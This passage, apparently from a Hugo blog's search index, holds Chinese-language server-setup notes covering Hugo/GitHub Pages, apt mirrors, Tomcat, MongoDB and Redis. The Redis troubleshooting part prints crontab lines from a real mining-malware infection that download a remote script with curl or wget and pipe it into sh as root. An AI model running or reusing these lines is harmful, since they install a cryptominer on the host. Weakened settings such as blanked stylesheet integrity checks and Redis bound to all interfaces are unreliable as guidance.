输入hugo就可以生成public文件夹，这个文件夹可以部署到云服务器或者托管到github上，\n注意：输入hugo的生成方式只会往public文件夹里添加内容，但是不会删除外部已经不存在而public里面还存在的文件\n所以一般用hugo -F --cleanDestinationDir命令，表示每次生成的public都是全新的，会覆盖原来的。\n在命令执行后，出现一个public文件夹，里面就是网站的静态页面文件\n进入public文件夹，将public文件夹的内容上传到github仓库中\n1 2 3 4 5 6 cd public git init ##初始化仓库 git remote add origin https://github.com/GoodmanBin/GoodmanBin.github.io.git ##链接远程仓库 git add . git commit -m \u0026#34;first commit\u0026#34; git push -u origin master 将public文件夹推送上去之后直接访问GoodmanBin.github.io会显示404，需到项目中勾选上Use your GitHub Pages website才可访问\n在此之后更新文章，使用hugo生成新的静态页面，并使用git push进行同步\n1 2 3 4 5 cd public git add . git status git commit -m \u0026#34;add blog post\u0026#34; git push 3. 解决 hugo 中关于 integrity 的错误 问题描述\n在 Github Pages 上部署 Hugo 博客后，网站样式丢失，打开浏览器 F12 控制台可以发现错误：Failed to find a valid digest in the 'integrity' attribute for resource \u0026quot;xxx.css\u0026quot;, The resource has been blocked.\n解决方法\n在 themes\\PaperMod\\layouts\\partials 文件夹下找到一个 head.html 文件，发现里面确实有 integrity=\u0026quot;{{ $stylesheet.Data.Integrity }}\u0026quot; 这么一句代码，把它改为 integrity=\u0026quot;\u0026quot; 然后重新发布\nHugo引入图片问题 直接使用typora的相对路径在生成静态网站的时候图片无法显示出来\nHugo的图片展示逻辑：\nHugo博客的根目录有一个static目录，这个static目录就是用来存放一些静态文件，比如图片、css、js文件等。 执行hugo命令的时候，会把static目录下的子目录或文件复制到public目录下。比如我在static下添加了一个img子目录，并且在img子目录放了图片，那执行hugo命令后，就会把static\\img文件的内容拷贝到public\\img里面。 大家都知道Hugo博客网站展示的其实是public下的内容，因此markdown文章里引用图片的时候，得引用pubic下的图片才可以。 具体操作非常简单，分2步：\n在static目录下创建img子目录，把markdown要使用的图片放在static\\img目录里。 在markdown文件里，按照如下格式引用图片(这里假设图片名称叫wechat.png)。这样最终public目录下生成的静态页面就可以引用到public\\img下的图片了。 1 ![](/img/wechat.png) 注意：\n严格注意路径：只能写成 /img/imagename.png 的形式（注意 / 和 \\ 的区别)\n可能是当前主题不支持的原因，嵌入图片的代码只能写成这样：![imagename](/img/imagename.png)；\u0026lt;img src=\u0026quot;\u0026quot; alt=\u0026quot;\u0026quot; style=\u0026quot;zoom:50%;\u0026quot; /\u0026gt; 这种格式的修改图片缩放比例的代码也是不能用的\n存放图片的文件夹不能有空格\n还可以用图床\nTypora配置图床 GitHub创建仓库并获取仓库Token 下载PicGo并安装 GitHub配置 设置参数说明：\n设定仓库名：填入你上面创建的仓库名，格式为：用户名/仓库名；\n设定分支名：一般填写 master 即可；\n设定 Token：将上一步 Github 配置中得到的 Token 粘贴进去；\n指定存储路径：图片在 Github 仓库中的存储路径，例如本人是：blog/202303/\n设定自定义域名：此处直接设置 jsDelivr 加速的访问地址，例如本人是：https://cdn.jsdelivr.net/gh/chance7bin/img-repo@main/\ngh 表示来自 Github 的仓库 chance7bin/img-repo 仓库的具体位置 main 仓库的分支 到此，配置过程已完成。\nPicGo配置 腾讯云COS https://cloud.tencent.com/developer/article/1834573 https://cloud.tencent.com/developer/article/2175760?from=15425\n阿里云OSS 阿里云OSS PicGo 配置图床教程 超详细\n配置Typora 偏好设置 → 图像 → 插入图片时：上传图片 → 上传服务设定：上传服务选择PiacGo，PicGo路径选择软件安装路径 → 配置完成\nObisidian配置图床 Obisidian对img的兼容不是很好\n打开 Obsidian 按箭头标识数字顺序：设置 =》 第三方插件 =》 关闭安全模式 =》 浏览社区插件\n搜索：Image auto upload Plugin\n安装后打开选项，默认什么都不要改。\n其中最后一项 PicGo server 也是默认填好的，如果没有，就在 PicGo 设置，默认都不要动。\n","permalink":"https://chance7bin.github.io/posts/note/%E4%BD%BF%E7%94%A8-hugo-+-github-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/","summary":"初见Hugo Hugo是由Go语言实现的静态网站生成器。简单、易用、高效、易扩展、快速部署。 1. 安装 Hugo 到 Hugo Releases 下载适合你的操作系统的版本。 Wind","title":"使用 Hugo + Github 搭建个人博客"},{"content":"Ubuntu apt换国内源 https://blog.csdn.net/RadiantJeral/article/details/104184351\nhttps://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/\n打开终端输入命令下载vim工具\n1 sudo apt-get install vim 1.备份 /etc/apt/sources.list\n1 sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak 2.编辑 /etc/apt/sources.list\n打开 /etc/apt/sources.list：\n1 sudo vim /etc/apt/sources.list 在命令模式下输入 ggdG，删除全部内容.\n在输入模式下，粘贴复制下列内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse 上面这个会报错\n仓库 “https://mirrors.tuna.tsinghua.edu.cn/ubuntu focal-security Release” 没有 Release 文件。 N: 无法安全地用该源进行更新，所以默认禁用该源。\n解决方法：https://blog.csdn.net/gezongbo/article/details/121056781\n适用于ubuntu18.04\n使用aliyun，将sources.list内容修改为下面内容\n1 2 3 4 5 deb http://mirrors.aliyun.com/ubuntu bionic main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu bionic-updates main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu bionic-security main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu bionic-proposed main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu bionic-backports main multiverse restricted universe 适用于ubuntu20.04\n使用aliyun，将sources.list内容修改为下面内容\n1 2 3 4 5 deb http://mirrors.aliyun.com/ubuntu focal main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu focal-updates main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu focal-security main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu focal-proposed main multiverse restricted universe deb http://mirrors.aliyun.com/ubuntu focal-backports main multiverse restricted universe 保存退出.\n3.更新\n1 sudo apt update 设置root密码 Ubuntu的默认root密码是随机的，即每次开机都有一个新的root密码。我们可以在终端输入命令 sudo passwd，然后输入当前用户的密码\n终端会提示我们输入新的密码并确认，此时的密码就是root新密码。修改成功后，输入命令 su root，再输入新的密码就ok了\n如何解决：不在 sudoers 文件中此事将被报告？\n1.首先切换到root用户下，输入当前用户账号密码\nsu - root\n2.输入sudo相关命令\nchmod 740 /etc/sudoers\nsudo gedit /etc/sudoers\n3.添加权限\n找到\n1 2 # Allow members of group sudo to execute any command %sudo ALL=(ALL) ALL 在下面添加一行，如下\nxx ALL=(ALL) ALL (将此处的XX修改为出现该问题的用户名！）\r拓展：\nsudo 命令需要输入当前用户的密码，su 命令需要输入 root 用户的密码\nLinux命令su、sudo、sudo su、sudo -i使用和区别\n提升用户权限 https://www.cnblogs.com/rnckty/p/5741956.html\nUbuntu默认root密码\nhttps://blog.csdn.net/jiangshuanshuan/article/details/95715837\n安装Java Java推荐用安装包安装 之后安装Tomcat比较方便\n安装包：\nhttps://blog.csdn.net/qq_34412086/article/details/88035820\n1.上传安装包jdk-8u301-linux-x64.tar.gz\n2.解压压缩包\ntar -zxvf jdk-8u301-linux-x64.tar.gz\n3.配置环境变量\nvim /etc/profile\n在末尾加入如下配置\n1 2 3 4 export JAVA_HOME=/opt/software/jdk1.8.0_301 export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:%{JAVA_HOME}/lib:%{JRE_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH 4.检查环境是否配置完成\nsource /etc/profile\njava -version\n命令行： 不会给你配JAVA_HOME\nhttps://blog.csdn.net/wan_ide/article/details/99447752\n输入命令：\n1 sudo apt install openjdk-8-jdk-headless 等待安装完成\n安装完成后用 java -version 检验是否安装成功\n1 java -version Linux如何查看JDK的安装路径\nhttps://www.cnblogs.com/kerrycode/p/4762921.html\n安装Tomcat https://blog.csdn.net/qq_34412086/article/details/88038210\n1.上传压缩包并解压\ntar -zxvf apache-tomcat-8.5.41.tar.gz\n2.配置startup.sh\n启动Tomcat之前先进入目录/usr/local/tomcat/apache-tomcat-7.0.93/bin，编辑文件startup.sh。在startup.sh文件最后的exec上方添加如下配置\n1 2 3 4 5 6 7 8 #set java environment export JAVA_HOME=/opt/software/jdk1.8.0_301 export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:%{JAVA_HOME}/lib:%{JRE_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH #tomcat export TOMCAT=/opt/software/apache-tomcat-8.5.41 3.关闭Tomcat之前先进入目录/usr/local/tomcat/apache-tomcat-7.0.93/bin，编辑文件shutdown.sh。配置shutdown.sh\n1 2 3 4 5 6 7 8 #set java environment export JAVA_HOME=/opt/software/jdk1.8.0_301 export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:%{JAVA_HOME}/lib:%{JRE_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH #tomcat export TOMCAT=/opt/software/apache-tomcat-8.5.41 4.启动\n进入到tomcat的bin目录下，./startup.sh\n后面的环境配置可以考虑不用（不知道会不会有什么问题）\n修改文件\n1 sudo gedit filename linux命令行下，在任意目录下启动Tomcat\nhttps://blog.csdn.net/qq_40794973/article/details/86591391\n==关闭TOMCAT日志的三个方法==\nhttps://blog.csdn.net/ZCY5202015/article/details/120685589\n开启远程连接ssh服务端 https://jingyan.baidu.com/article/359911f5a5b74857fe0306c4.html\n首先看看自己的Ubuntu是不是已经安装或启用了ssh服务，执行ps -e | grep ssh\n我们看到只有ssh-agent 这个是ssh-client客户端服务，如果有sshd，证明你已经装好了ssh-server并已启用，当然就可以不用往下看了\n如果没有安装执行sudo apt install openssh-server开始安装，输入yes回车\n执行完了就代表安装完成了\n然后再执行ps -e | grep ssh，发现多了sshd,远程连接本电脑就已经启用了\n然后我们通过其他电脑或服务器连接本电脑执行ssh \u0026lsquo;你的用户名\u0026rsquo;@‘你的ip’，然后输入yes,然后输入密码，就成功连接了\n最后执行ls，可以看到自己熟悉的ubuntu文件了\n开启远程连接ubuntu root权限 https://blog.csdn.net/qq_35445306/article/details/78771398\nUbuntu输入su提示认证失败的解决方法（接上） https://blog.csdn.net/henren555/article/details/7546508\n1 2 3 4 5 6 7 8 9 10 11 终端下 studiogang@studiogang:~$ sudo passwd Password: \u0026lt;--- 输入安装时那个用户的密码 Enter new UNIX password: \u0026lt;--- 新的Root用户密码 Retype new UNIX password: \u0026lt;--- 重复新的Root用户密码 passwd：已成功更新密码 xshell一直断开连接：Socket error Event: 32 Error: 10053 https://blog.csdn.net/betonme/article/details/102546857\n修改/etc/ssh/sshd_config文件\n1 vim /etc/ssh/sshd_config 将port的注释#删去，重启ssh服务 ,\n1 service ssh restart 安装Nginx https://www.cnblogs.com/fengkun125/p/14142912.html\n参考尚硅谷的教程安装 用wget安装Nginx\n1 2 3 4 5 # 切换至root用户 sudo su root apt-get install nginx nginx -v service nginx start 用安装包一堆坑\nsudo make \u0026amp;\u0026amp; make install 后面那个命令会报没有权限\n未发现软件包gcc-c+：\n1 2 sudo apt install gcc sudo apt install g++ zlib 找不到：\n直接wget安装\nhttps://www.php.cn/blog/detail/13838.html\nTomcat开放对外的端口 查看已经开放的端口号\n1 firewall-cmd --list-all 对外开放访问的端口\n1 2 3 firewall-cmd --add-port=8080/tcp --permanent firewall-cmd --reload 关闭对外端口\n1 2 firewall-cmd --remove-port=80/tcp --permanent firewall-cmd --reload Windows文件换行符转Linux换行符 https://blog.csdn.net/cjf_iceking/article/details/47836201\n操作系统文件换行符\n首先介绍下，在ASCII中存在这样两个字符CR（编码为13）和 LF（编码为10），在编程中我们一般称其分别为\u0026rsquo;\\r\u0026rsquo;和\u0026rsquo;\\n\u0026rsquo;。他们被用来作为换行标志，但在不同系统中换行标志又不一样。下面是不同操作系统采用不同的换行符：\n1 2 3 4 Unix和类Unix（如Linux）：换行符采用 \\n Windows和MS-DOS：换行符采用 \\r\\n Mac OS X之前的系统：换行符采用 \\r Mac OS X：换行符采用 \\n 使用cat -A [Filename] 查看\n使用命令\u0026quot;dos2unix\u0026quot;，如下所示\n1 2 [root@localhost test]# dos2unix gggggggg.txt dos2unix: converting file gggggggg.txt to UNIX format ... 安装anaconda 第一步 - 检索最新版本的Anaconda\n在Web浏览器中，转到Anaconda下载页面，可通过以下链接访问：\n1 https://www.anaconda.com/download/ 找到最新的Linux版本并复制安装程序bash脚本。\nAnaconda安装包下载\n（1）官网下载，下载速度较慢 （2）清华大学开源软件镜像站\n第二步 - 下载Anaconda Bash脚本\n以sudo非root用户身份登录到您的Ubuntu 18.04服务器，进入该/tmp目录并使用curl下载您从Anaconda网站复制的链接：\n1 2 cd /tmp curl -O https://repo.anaconda.com/archive/Anaconda3-5.2.0-Linux-x86_64.sh 或者下载完成后把bash脚本传输到linux上\n第三步 - 验证安装程序的数据完整性\n通过SHA-256校验和通过加密哈希验证确保安装程序的完整性：\n1 sha256sum Anaconda3-5.2.0-Linux-x86_64.sh 输出如下所示：\n1 09f53738b0cd3bb96f5b1bac488e5528df9906be2480fe61df40e0e0d19e3d48 Anaconda3-5.2.0-Linux-x86_64.sh 第四步 - 运行Anaconda脚本\n1 bash Anaconda3-5.2.0-Linux-x86_64.sh 将收到以下输出以查看许可协议，按ENTER键直到到达结尾。\n1 2 3 4 5 6 7 8 Welcome to Anaconda3 5.2.0 In order to continue the installation process, please review the license agreement. Please, press ENTER to continue \u0026gt;\u0026gt;\u0026gt; ... Do you approve the license terms? [yes|no] 当到达许可证末尾时，只要同意完成安装的许可证即可输入yes。\n第五步 - 完成安装过程\n一旦同意许可，系统将提示选择安装位置。可以按ENTER接受默认位置，或指定其他位置。\n1 2 3 4 5 6 7 8 Anaconda3 will now be installed into this location: /home/sammy/anaconda3 - Press ENTER to confirm the location - Press CTRL-C to abort the installation - Or specify a different location below [/home/sammy/anaconda3] \u0026gt;\u0026gt;\u0026gt; 此时，安装将继续。请注意，安装过程需要一些时间。\n第六步 - 选择选项\n安装完成后，您将收到以下输出：\n1 2 3 4 5 ... installation finished. Do you wish the installer to prepend the Anaconda3 install location to PATH in your /home/sammy/.bashrc ? [yes|no] [no] \u0026gt;\u0026gt;\u0026gt; 建议输入yes以使用该conda命令。\n接下来，系统将提示下载Visual Studio Code，可以从官方VSCode网站了解更多信息。\n输入yes要安装和no拒绝安装。\n第七步 - 激活安装\n现在可以使用以下命令激活安装：\n1 source ~/.bashrc 第八步 - 测试安装\n使用此conda命令测试安装和激活：\n1 conda list 将收到通过Anaconda安装可用的所有软件包的输出。\n第九步 - 设置Anaconda环境\n可以使用该conda create命令创建Anaconda环境。例如，可以使用以下命令创建名为my_env的Python 3环境：\n1 conda create --name my_env python=3 像这样激活新环境：\n1 source activate my_env 您的命令提示符前缀将更改以反映您处于活动的Anaconda环境中，现在您已准备好开始处理项目。\n常用命令\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 #创建虚拟环境 conda create -n your_env_name python=X.X（3.6、3.7等） #激活虚拟环境 source activate your_env_name(虚拟环境名称) #退出虚拟环境 source deactivate your_env_name(虚拟环境名称) #删除虚拟环境 conda remove -n your_env_name(虚拟环境名称) --all #查看安装了哪些包 conda list #安装包 conda install package_name(包名) conda install scrapy==1.3 # 安装指定版本的包 conda install -n 环境名 包名 # 在conda指定的某个环境中安装包 #查看当前存在哪些虚拟环境 conda env list #或 conda info -e #或 conda info --envs #检查更新当前conda conda update conda #更新anaconda conda update anaconda #更新所有库 conda update --all #更新python conda update python 安装mongodb apt安装 https://blog.csdn.net/yutu75/article/details/110941936\n基本安装\n目前最新版本为4.4版本，ubuntu20.04中默认安装的是3.6版本【可以继续基于这个版本进行学习，这块内容跳过即可】。\n安装之前建议更新下Linux源.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # 1、备份源文件 sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak # 2、添加源到sources.list中 sudo gedit /etc/apt/sources.list # 在打开的文本中，添加阿里源 deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse # 3、更新源 sudo apt-get update 如果要在ubuntu20.04中安装最新4.4版本mongodb，则需要完成以下命令步骤：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # 安装依赖包 sudo apt-get install libcurl4 openssl # 关闭和卸载原有的mongodb service mongodb stop sudo apt-get remove mongodb # 导入包管理系统使用的公钥 wget -qO - https://www.mongodb.org/static/pgp/server-4.4.asc | sudo apt-key add - # 如果命令执行结果没有显示OK，则执行此命令在把上一句重新执行：sudo apt-get install gnupg # 注册mongodb源 echo \u0026#34;deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/4.4 multiverse\u0026#34; | sudo tee /etc/apt/sources.list.d/mongodb-org-4.4.list # 更新源 sudo apt-get update # 安装mongodb sudo apt-get install -y mongodb-org=4.4.2 mongodb-org-server=4.4.2 mongodb-org-shell=4.4.2 mongodb-org-mongos=4.4.2 mongodb-org-tools=4.4.2 # 安装过程中如果提示: mongodb-org-tools : 依赖: mongodb-database-tools 但是它将不会被安装 # 终端下运行以下命令,解决: # sudo apt-get autoremove mongodb-org-mongos mongodb-org-tools mongodb-org # sudo apt-get install -y mongodb-org=4.4.2 # 创建数据存储目录 sudo mkdir -p /data/db # 修改配置，开放27017端口 sudo vim /etc/mongod.conf # 把12行附近的port=27017左边的#号去掉 启动和关闭MongoDB\n1 2 3 4 5 6 7 8 9 10 11 12 13 # 重新加载配置，并启动mongodb sudo systemctl daemon-reload sudo systemctl start mongod # 查看运行状态 sudo systemctl status mongod # 如果mongodb状态为stop，则运行 sudo systemctl enable mongod # 停止mongodb sudo systemctl stop mongod # 重启mongodb sudo systemctl restart mongod Ubuntu安装mongo并设置账户密码\n==问题：==\nmongodb启动之后立马关闭\n1.修改/tmp目录下mongodb-23266.sock的权限\n1 2 3 4 5 cd /tmp ls -l *.sock chown root:root mongodb-23266.sock systemctl start mongod systemctl status mongod 修改之后启动mongodb，出现另外一个错误\n打开日志查看错误：\n==建议重装==\n压缩包安装 mongodb彻底卸载方式 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 1.停止 mongodb服务 sudo service mongod stop 2.卸载mongodb sudo apt-get remove mongodb 3.移除相关包 sudo apt-get purge mongodb-org* sudo apt-get purge mongodb sudo apt-get autoremove sudo apt-get autorclean 4.移除相关目录 sudo rm -r /var/log/mongodb sudo rm -r /var/lib/mongodb 5.查看系统还有哪些残留的文件或目录 whereis mongo whereis mongodb whereis mongod which mongo which mongodb which mongod 6.删除/data/db（我自己加的） rm -rf /data/db 安装redis ==重要的事情说三遍！：服务器上不要开放对外端口，必要时修改端口，设置密码，不然会被注入cleanfda木马==\nhttps://developer.aliyun.com/article/764565\n一、在 Ubuntu 20.04 上安装 Redis\n在 Ubuntu 上安装 Redis 非常简单直接。\nRedis 5.0 被包含在默认的 Ubuntu 20.04 软件源中。想要安装它，以 root 或者其他 sudo 身份运行下面的命令：\n1 2 sudo apt update sudo apt install redis-server 一旦安装完成，Redis 服务将会自动启动。想要检查服务的状态，输入下面的命令：\n1 sudo systemctl status redis-server 你应该看到下面这些：\n1 2 3 4 5 ● redis-server.service - Advanced key-value store Loaded: loaded (/lib/systemd/system/redis-server.service; enabled; vendor preset: enabled) Active: active (running) since Sat 2020-06-06 20:03:08 UTC; 10s ago ... 如果你的服务器上禁用 IPv6，那么 Redis 服务将会启动失败。 就这些。你已经在你的 Ubuntu 20.04 上安装并运行了 Redis。\n二、配置 Redis 远程访问\n默认情况下，Redis 不允许远程连接。你仅仅只能从127.0.0.1（localhost）连接 Redis 服务器 - Redis 服务器正在运行的机器上。\n如果你正在使用单机，数据库也同样在这台机器上，你不需要启用远程访问。\n想要配置 Redis 来接受远程访问，使用你的文本编辑器打开 Redis 配置文件 （查看redis配置文件位置）：\n1 sudo nano /etc/redis.conf 定位到以bind 127.0.0.1 ::1开头的一行，并且取消它的注释：\n1 2 # bind 0.0.0.0 ::1 如果你的服务器有局域网 IP，并且你想要 Redis 从局域网可以访问 Redis，在这一行后面加上服务器局域网 IP 地址。 保存这个文件，并且重启 Redis 服务，使应用生效：\n1 sudo systemctl restart redis-server 使用下面的命令来验证 Redis 服务器正在监听端口6379：\n1 ss -an | grep 6379 你应该能看到类似下面的信息：\n1 2 tcp LISTEN 0 511 0.0.0.0:6379 0.0.0.0:* tcp LISTEN 0 511 [::]:6379 [::]:* 同时还要进行如下配置，防止redis运行几天后报错\nRedis踩坑——MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on\n1.直接修改redis.conf配置文件，但是更改后需要重启redis。\n修改redis.conf文件：\n（1）vim打开redis-server配置的redis.conf文件 /etc/redis/redis.conf，\n（2）使用快捷匹配模式：\n/stop-writes-on-bgsave-error定位到stop-writes-on-bgsave-error字符串所在位置，\n（3）把后面的yes设置为no。\n2.在/etc/sysctl.conf 添加一项 vm.overcommit_memory = 1 ，然后重启（或者运行命令sysctl vm.overcommit_memory=1 ）使其生效）\n使用如下命令刷新配置，使其立即生效：\n1 2 sysctl -p sysctl -w net.ipv4.route.flush=1 重启redis失效\n杀死redis进程重新restart\nps -ef | grep redis\nkill -s 9 进程id\nsystemctl restart redis.service\n还是启动不起来，打开日志查看问题\ncat /var/log/redis/redis-server.log\nWrite error saving DB on disk: No space left on device\n查看磁盘的占用情况\ndf -h\n还真满了\n寻找原因：\n从根目录下开始使用du命令查找出空间占用最大的文件\n1 2 #查看当前目录下每个文件夹所占用的空间 du -sh * 删除掉大文件之后还是不行，再次执行df -h查看磁盘使用状况，可以看到/snap下的文件使用情况都是100%\n可以看到/opt文件夹占用了极大的空间，再一层层排查发现是tomcat生成的日志文件过大\n删除掉tomcat的日志即可\nhttps://blog.csdn.net/ZCY5202015/article/details/120685589\n杀死redis进程失效\n执行sysctl vm.overcommit_memory=1便可重启redis： systemctl restart redis.service\nredis启动报WARNING\n8423:M 01 Aug 10:47:50.770 # WARNING you have Transparent Huge Pages (THP) support enabled in your ernel. This will create latency and memory usage issues with Redis. To fix this issue run the commad \u0026rsquo;echo never \u0026gt; /sys/kernel/mm/transparent_hugepage/enabled\u0026rsquo; as root, and add it to your /etc/rc.loal in order to retain the setting after a reboot. Redis must be restarted after THP is disabled.\nroot用户执行echo never \u0026gt; /sys/kernel/mm/transparent_hugepage/enabled\n编辑/etc/rc.local在最后一行添加echo never \u0026gt; /sys/kernel/mm/transparent_hugepage/enabled\n重启redis： systemctl restart redis.service\n8528:M 01 Aug 11:00:34.857 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.\n解决方法\n方式一：设置的值128较低，需要“echo 511 \u0026gt; /proc/sys/net/core/somaxconn”命令，注意此命令只是暂时生效，如果重启后就会失效。\n方式二：永久解决Redis中The TCP backlog setting of 511 cannot be enforced告警问题，编辑/etc/sysctl.conf文件，添加net.core.somaxconn = 1024然后执行sysctl -p命令查看是否添加成功，之后重启Redis服务即可。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 [root@mrwang redis-4.0.9]# vim /etc/sysctl.conf [root@mrwang redis-4.0.9]# sysctl -p vm.swappiness = 0 kernel.sysrq = 1 net.ipv4.neigh.default.gc_stale_time = 120 net.ipv4.conf.all.rp_filter = 0 net.ipv4.conf.default.rp_filter = 0 net.ipv4.conf.default.arp_announce = 2 net.ipv4.conf.lo.arp_announce = 2 net.ipv4.conf.all.arp_announce = 2 net.ipv4.tcp_max_tw_buckets = 5000 net.ipv4.tcp_syncookies = 1 net.ipv4.tcp_max_syn_backlog = 1024 net.ipv4.tcp_synack_retries = 2 net.core.somaxconn = 1024 systemctl status redis-server 报错\nredis-server.service: Can\u0026rsquo;t open PID file /var/run/redis/redis-server.pid (yet?) after start: No such file or directory\n解决方法如下：\nhttps://blog.csdn.net/zhangpeterx/article/details/104093275\n1 2 vi /usr/lib/systemd/system/redis.service #centos 7 nano /etc/systemd/system/redis.service #debian/ubuntu 在[Service]下新增一行ExecStartPost=/bin/sh -c \u0026quot;echo $MAINPID \u0026gt; /var/run/redis/redis.pid\u0026quot;\n1 2 3 4 5 [Service] Type=forking ExecStart=/usr/bin/redis-server /etc/redis/redis.conf ExecStop=/bin/kill -s TERM $MAINPID ExecStartPost=/bin/sh -c \u0026#34;echo $MAINPID \u0026gt; /var/run/redis/redis.pid\u0026#34; 随后重启服务：\n1 2 3 sudo systemctl daemon-reload sudo systemctl enable redis-server sudo systemctl restart redis.service redis运行时日志报错\n==Redis被挖矿脚本注入了！！！==\n3543227:M 01 Aug 2022 21:27:36.031 * 1 changes in 900 seconds. Saving\u0026hellip; 3543227:M 01 Aug 2022 21:27:36.031 * Background saving started by pid 3604362 3604362:C 01 Aug 2022 21:27:36.031 # Failed opening the RDB file crontab (in server root dir /etc) for saving: Read-only file system 3543227:M 01 Aug 2022 21:27:36.131 # Background saving error\nhttps://blog.csdn.net/zhangjunli/article/details/103817837\n1 2 3 4 5 6 7 8 9 root@VM-0-10-ubuntu:/etc/redis# redis-cli 127.0.0.1:6379\u0026gt; config get dir 1) \u0026#34;dir\u0026#34; 2) \u0026#34;/etc\u0026#34; 127.0.0.1:6379\u0026gt; config set dir /var/lib/redis OK 127.0.0.1:6379\u0026gt; config get dir 1) \u0026#34;dir\u0026#34; 2) \u0026#34;/var/lib/redis\u0026#34; 1 2 3 4 */2 * * * * root cd1 -fsSL http://en2an.top/cleanfda/init.sh | sh */3 * * * * root wget -q -O- http://en2an.top/cleanfda/init.sh | sh */4 * * * * root curl -fsSL http://195.242.111.238/cleanfda/init.sh | sh */5 * * * * root wd1 -q -O- http://195.242.111.238/cleanfda/init.sh | sh Linux管理python推荐使用miniconda 安装miniconda\nhttps://www.jianshu.com/p/47ed480daccc\n1、下载最新版 miniconda：\n1 wget https://repo.continuum.io/miniconda/Miniconda3-latest-Linux-x86_64.sh 2、在bash中安装：\n1 sh Miniconda3-latest-Linux-x86_64.sh 3、安装完成后，关闭terminal后，重新打开，输入以下命令以验证是否安装成功：\n1 conda -V 4、若要卸载，可直接删除已安装的文件夹后，并删除相应的环境变量：\n1 2 rm -rf /usr/local/miniconda/ rm -rf /usr/local/anaconda/ 删除后，打开 ~/.bashrc 文件，删除以下conda的路径变量：\n1 2 export PATH=\u0026#34; /usr/local/anaconda/bin:$PATH\u0026#34; export PATH=\u0026#34; /usr/local/miniconda3/bin:$PATH\u0026#34; 解决方案：\n打开一个终端，然后输入命令行打开bashrc文件：\n1 sudo gedit ~/.bashrc 注意这里要有sudo，不然无法编辑里面的内容。\n打开自己的安装目录/opt/software/miniconda3/bin，输入指令pwd查看路径。\n在bashrc文件中输入：\n1 export PATH=\u0026#34;/opt/software/miniconda3/bin:$PATH\u0026#34; 保存关闭bashrc文件，在命令行输入：\n1 source ~/.bashrc 随后检测一下：\n1 conda --version 如上图所示，成功。\n常用指令\nconda activate GIS\nconda create -n Name python=3.x(2.x)\nconda install xx (pip install xx)\nconda deactivate\n新建用户 如下操作都是在root用户下进行的\n新增单个用户 1 useradd user1 设置密码\n1 passwd user1 设置密码的时候，有的密码无法通过字典检查。 可以通过修改：/etc/security/pwquality.conf 文件 关闭字典检查。\n修改完成之后： 但是不建议这么修改。建议换个密码。\n删除帐号 删除一个已有的用户账号使用userdel命令，其格式如下：\n1 userdel 选项 用户名 常用的选项是 -r，它的作用是把用户的主目录一起删除。\n例如：\n1 # userdel -r sam 此命令删除用户sam在系统文件中（主要是/etc/passwd, /etc/shadow, /etc/group等）的记录，同时删除用户的主目录。\n/etc/passwd文件是用户管理工作涉及的最重要的一个文件。\nLinux系统中的每个用户都在/etc/passwd文件中有一个对应的记录行，它记录了这个用户的一些基本属性。\n1 2 3 4 5 6 7 8 9 10 11 12 13 ＃ cat /etc/passwd root❌0:0:Superuser:/: 